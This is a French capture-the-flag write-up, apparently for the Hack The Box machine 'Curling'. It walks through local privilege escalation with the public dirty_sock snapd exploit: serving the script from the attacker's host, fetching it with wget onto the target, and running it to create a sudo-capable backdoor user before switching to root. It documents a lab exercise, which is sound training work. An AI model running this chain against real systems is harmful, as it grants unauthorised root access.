# Privesc Curling

Bonsoir à tous, j'ai trouvé un moyen d'être root sur la machine Curling avec un moyen très simple et très efficace et rapidement.
Il y'avais une possiblité d'être root grâce au programme dirty_sock, une vulnérabilité très récente sur les machines Ubuntu en général.

Comment faire pour être root sur la machine Curling ? C'est pas très compliqué regardez les explications ;)

Dirty Sock
----

Vous devez simplement installé l'outil dirty_sock avec git, et ensuite de transférer le script sur la machine cible et d'éxecute le script.

    root@Computer:~/htb/writeup/Curling# git clone https://github.com/initstring/dirty_sock.git
    Clonage dans 'dirty_sock'...
    remote: Enumerating objects: 47, done.
    remote: Counting objects: 100% (47/47), done.
    remote: Compressing objects: 100% (19/19), done.
    remote: Total 47 (delta 26), reused 47 (delta 26), pack-reused 0
    Dépaquetage des objets: 100% (47/47), fait.
    Vérification de la connectivité... fait.

Après avoir installé et cloner ça sur votre machine physique suffis maintenant de transférer le fichier Python sur la machine cible et d'éxecuter le script. Pour le transfert de fichier je vous conseille SimpleHTTPServer.

    root@Computer:~/htb/writeup/Curling# python -m SimpleHTTPServer 9001
    Serving HTTP on 0.0.0.0 port 9001 ...
    
Exécuter premièrement ça sur votre machine physique, et il faut être dans le dossier dirty_sock (important). Une fois la commande tapé il vous suffit d'utiliser la commande wget sur la machine cible et de télécharger les deux scripts.

    floris@curling:/tmp$ wget http://10.10.15.173:9001/dirty_sockv1.py -O dirty_sockv1.py
    [..SNIP...]
    Saving to: ‘dirty_sockv1.py’

    dirty_sockv1.py                          100%[==================================================================================>]   5.37K  --.-KB/s    in 0.001s  

    2019-03-30 20:24:21 (10.1 MB/s) - ‘dirty_sockv1.py’ saved [5501/5501]

    floris@curling:/tmp$ wget http://10.10.15.173:9001/dirty_sockv2.py -O dirty_sockv2.py
    [...SNIP...]
    Saving to: ‘dirty_sockv2.py’

    dirty_sockv2.py                          100%[==================================================================================>]   8.49K  --.-KB/s    in 0s      

    2019-03-30 20:24:39 (109 MB/s) - ‘dirty_sockv2.py’ saved [8696/8696]

    floris@curling:/tmp$
    
Le résultat sur votre machine physique, si nous regardons bien, le fichier a été bien transférer avec sans aucune erreur sur la machine physique.

    10.10.10.150 - - [30/Mar/2019 21:24:21] "GET /dirty_sockv1.py HTTP/1.1" 200 -
    10.10.10.150 - - [30/Mar/2019 21:24:39] "GET /dirty_sockv2.py HTTP/1.1" 200 -
    
Voilà, ensuite vous devez simplement exécuter l'outil dirty_sockv2.py et d'attendre que le programme crée un utilisateur dirty_sock et de vous connectez ensuite avec la commande su.    

    floris@curling:/tmp$ python3 dirty_sockv2.py 

          ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
          |  \ | |__/  |   \_/      [__  |  | |    |_/  
          |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                           (version 2)

    //=========[]==========================================\\
    || R&D     || initstring (@init_string)                ||
    || Source  || https://github.com/initstring/dirty_sock ||
    || Details || https://initblog.com/2019/dirty-sock     ||
    \\=========[]==========================================//


    [+] Slipped dirty sock on random socket file: /tmp/zkvlivrbmj;uid=0;
    [+] Binding to socket file...
    [+] Connecting to snapd API...
    [+] Deleting trojan snap (and sleeping 5 seconds)...
    [+] Installing the trojan snap (and sleeping 8 seconds)...
    [+] Deleting trojan snap (and sleeping 5 seconds)...



    ********************
    Success! You can now `su` to the following account and use sudo:
       username: dirty_sock
       password: dirty_sock
    ********************

Vous devez tapé la commande sudo su pour vous connectez en tant que utilisateur (dirty_sock).

    floris@curling:/tmp$ su - dirty_sock
    Password: 
    dirty_sock@curling:~$
    
Une fois que vous avez réussis a vous connectez en tant que dirty_sock vous devez simplement tapé la commande sudo su, et de remettre le mot de passe de l'utilisateur pour vous connectez en tant que root et avoir un accès root sur la machine cible.

    root@curling:/home/dirty_sock# sudo su
    [sudo] password for dirty_sock: 
    root@curling:/home/dirty_sock#

Voilà nous sommes root avec succès.

[![forthebadge made-with-python](https://media1.giphy.com/media/4PSEQpvV5wUpnmpP1l/giphy.gif?cid=790b76115c9fd2056341686e77c521a2)]
